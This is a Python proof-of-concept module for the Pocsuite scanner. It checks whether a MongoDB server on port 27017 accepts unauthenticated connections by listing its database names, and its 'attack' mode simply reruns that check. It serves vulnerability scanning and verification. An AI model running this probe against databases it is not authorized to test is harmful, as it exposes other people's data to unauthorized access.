#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
reload(sys)
sys.setdefaultencoding('utf8')
from pymongo import MongoClient
from pocsuite.api.poc import POCBase, Output
from pocsuite.api.poc import register


class TestPOC(POCBase):
    vulID = '78176'  # https://www.seebug.org/vuldb/ssvid-78176
    version = '1.0'
    author = 'zeal'
    vulDate = '2013-02-14'
    createDate = '2013-02-14'
    updateDate = '2013-02-14'
    references = ['http://www.s3cur1ty.de/m1adv2013-003']
    name = 'MongoDB Unauthorized'
    appPowerLink = ''
    appName = 'MongoDB'
    appVersion = 'All'
    vulType = 'Unauthorized'
    desc = 'MongoDB 默认没有开启相关认证, 黑客直接访问即可获取数据库中所有信息.'
    samples = []
    defaultPorts = [27017]
    defaultService = ['mongo', 'mongodb']

    def parse_target(self, target, default_port):
        schema = 'http'
        port = default_port
        address = ''
        if '://' in target:
            slices = target.split('://')
            schema = slices[0]
            target = slices[1]
        if ':' in target:
            slices = target.split(':')
            address = slices[0]
            port = slices[1]
        else:
            address = target
        return {'schema': schema, 'address': address, 'port': int(port)}

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        try:
            target = self.parse_target(self.target, 27017)
            # connection = pymongo.MongoClient(target['address'], target['port'], socketTimeoutMS=3000)
            connection = MongoClient(target['address'], port=target['port'], connect=False)
            dbs = connection.database_names()
            if dbs:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = '%s:%i存在MongoDB未授权' % (target['address'], target['port'])
        except Exception as e:
            print e

        return self.parse_output(result)

    def parse_output(self, result):
        print 'parse_output'
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('failed connect')
        return output


register(TestPOC)
